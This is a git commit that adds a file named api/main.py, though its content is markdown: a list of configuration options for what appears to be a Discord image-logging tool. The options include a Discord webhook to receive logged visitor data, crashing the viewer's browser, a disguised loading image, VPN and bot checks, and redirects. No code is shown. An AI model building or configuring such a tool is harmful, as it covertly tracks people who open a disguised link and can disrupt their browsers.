f059f9ba1b9284fcca19839058107dd9abcf44b9
Undercov <134236114+Undercov@users.noreply.github.com>
2023-05-26 04:37:03 +0200

    Add files via upload

---
+++ api/main.py
@@ -0,0 +1,15 @@
+**WEBHOOK:** `Your Discord webhook!` <br>
+**IMAGE:** `A LINK to your desired Image.` <br>
+**IMAGEARGUMENT:** `Enable image reading from the argument. (See Annotation #1)` <br>
+**USERNAME:** `The username of the bot that sends` <br>
+**COLOR:** `The embed's sidebar color` <br>
+**DOCRASHBROWSER:** `Crash the user's browser` <br>
+**DOMESSAGE:** `Show a custom message when they click?` <br>
+**MESSAGE:** `The message to show.` <br>
+**RICHMESSAGE:** `Enable a rich message, which allows inserting variables. (See Annotation #2)` <br>
+**VPNCHECK:** `Prevent VPNs from spamming your webhook!` <br>
+**LINKALERTS:** `Tell you when someone sends an image logging link` <br>
+**BUGGEDIMAGE:** `Display a loading image on Discord` <br>
+**ANTIBOT:** `Prevent bots from spamming your webhook!` <br>
+**REDIRECT:** `Redirect user?` <br>
+**PAGE:** `Page to redirect to, if so` <br>
